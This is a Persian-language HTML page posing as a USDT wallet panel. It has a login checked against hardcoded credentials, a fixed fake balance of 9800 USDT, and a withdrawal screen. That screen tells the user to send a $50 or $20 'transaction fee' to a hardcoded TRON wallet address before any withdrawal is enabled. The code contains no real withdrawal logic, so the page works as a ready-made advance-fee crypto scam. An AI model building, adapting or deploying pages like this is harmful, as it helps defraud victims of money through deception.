
<!DOCTYPE html>
<html lang="fa">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>پنل USDT</title>
    <style>
        body {
            font-family: sans-serif;
            margin: 0;
            padding: 0;
            background: #f2f2f2;
            direction: rtl;
            text-align: center;
        }
        .login-box, .dashboard, .withdraw {
            margin: 60px auto;
            padding: 30px;
            width: 90%;
            max-width: 450px;
            background: #fff;
            border-radius: 12px;
            box-shadow: 0 0 18px #00000022;
        }
        input {
            width: 90%;
            padding: 10px;
            margin: 10px 0;
            border-radius: 6px;
            border: 1px solid #ccc;
            font-size: 16px;
        }
        button {
            padding: 12px 25px;
            background: #111;
            color: #fff;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 18px;
        }
        button:hover {
            opacity: 0.8;
        }
        h2 {
            margin-bottom: 15px;
        }
        .checkbox-label {
            display: block;
            margin: 10px 0;
            text-align: right;
        }
    </style>
</head>
<body>

<div class="login-box" id="loginBox">
    <h2>ورود به پنل</h2>
    <input type="text" id="username" placeholder="یوزرنیم">
    <input type="password" id="password" placeholder="پسورد">
    <br>
    <button onclick="login()">ورود</button>
</div>

<div class="dashboard" id="dashboard" style="display:none;">
    <h2>موجودی شما: <span id="balance">9800</span> USDT</h2>
    <button onclick="showWithdraw()">برداشت</button>
</div>

<div class="withdraw" id="withdraw" style="display:none;">
    <h2>آدرس برداشت تتر شبکه ترون (TRC20) را وارد کنید</h2>
    <input type="text" id="walletAddress" placeholder="آدرس کیف پول">
    <div class="checkbox-label">
        <input type="checkbox" id="more1000" onchange="updateMessage()"> درخواست برداشت بیشتر از ۱۰۰۰ دلار
    </div>
    <div class="checkbox-label">
        <input type="checkbox" id="less100" onchange="updateMessage()"> درخواست برداشت کمتر از ۱۰۰ دلار
    </div>
    <p id="message"></p>
    <h3>آدرس کیف پول: TH29Jnxb2PuPEjCmgPvmHJEpTE7RNmxdcs</h3>
</div>

<script>
    const defaultUsername = 'aref';
    const defaultPassword = 'aref';

    function login() {
        const u = document.getElementById('username').value;
        const p = document.getElementById('password').value;
        if(u === defaultUsername && p === defaultPassword){
            document.getElementById('loginBox').style.display = 'none';
            document.getElementById('dashboard').style.display = 'block';
        } else {
            alert('یوزرنیم یا پسورد اشتباه است!');
        }
    }

    function showWithdraw() {
        document.getElementById('dashboard').style.display = 'none';
        document.getElementById('withdraw').style.display = 'block';
    }

    function updateMessage() {
        const more = document.getElementById('more1000').checked;
        const less = document.getElementById('less100').checked;
        const msg = document.getElementById('message');

        if(more) {
            msg.textContent = 'جهت انجام کارمزد تراکنش شبکه تتر مبلغ ۵۰ دلار به آدرس زیر ارسال کنید و بعد درخواست برداشت برای شما فعال می‌شود.';
        } else if(less) {
            msg.textContent = 'کارمزد برداشت ۲۰ دلار می‌باشد به آدرس زیر و سپس انتقال شما انجام می‌شود.';
        } else {
            msg.textContent = '';
        }
    }
</script>

</body>
</html>
